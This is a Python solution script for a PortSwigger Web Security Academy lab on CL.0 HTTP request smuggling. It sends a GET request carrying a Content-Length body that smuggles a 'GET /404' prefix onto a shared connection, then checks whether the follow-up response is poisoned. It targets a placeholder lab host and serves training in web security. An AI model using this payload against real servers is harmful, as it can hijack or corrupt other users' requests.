"""
Lab 17: CL.0 request smuggling
https://portswigger.net/web-security/request-smuggling/browser/cl-0
Difficulty: Practitioner

📝 The back-end ignores Content-Length entirely for certain request types
(commonly GET requests, or requests to specific endpoints it doesn't expect
a body on) and treats the body length as 0 regardless of the header — while
the front-end still forwards based on the stated Content-Length. Anything
after what the back-end considers "0 bytes of body" becomes a smuggled
prefix for the next request on the connection.
"""

from utils import send_same_connection, normalize_crlf, log, note, summarize_response

HOST = "YOUR-LAB-ID.web-security-academy.net"

# A GET with a body + Content-Length — technically unusual but not rejected
# by many front-ends, and exactly where back-ends are most likely to assume
# "GET never has a body" and silently treat it as zero-length.
SMUGGLE_PAYLOAD = normalize_crlf("""GET / HTTP/1.1
Host: {host}
Content-Type: application/x-www-form-urlencoded
Content-Length: 44

GET /404 HTTP/1.1
X-Ignore: X""".format(host=HOST))

FOLLOWUP = normalize_crlf("""GET / HTTP/1.1
Host: {host}

""".format(host=HOST))


def run():
    note("Content-Length: 44 on a GET — front-end forwards the full 44 bytes")
    note("as body, back-end (CL.0) ignores Content-Length for GETs entirely")
    note("and treats the smuggled bytes as the START of the next request.")

    (r1, _), (r2, _) = send_same_connection(HOST, [SMUGGLE_PAYLOAD, FOLLOWUP])
    summarize_response(r1, "Smuggle request response")
    summarize_response(r2, "Follow-up response")

    if b" 404 " in r2.split(b"\r\n", 1)[0]:
        log("Confirmed: follow-up got mangled by the smuggled prefix.")
    else:
        note("Recount Content-Length to match the smuggled bytes exactly —")
        note("44 above assumes a specific line-ending count; verify against")
        note("the literal \\r\\n-joined byte length of the GET /404 block.")


if __name__ == "__main__":
    run()
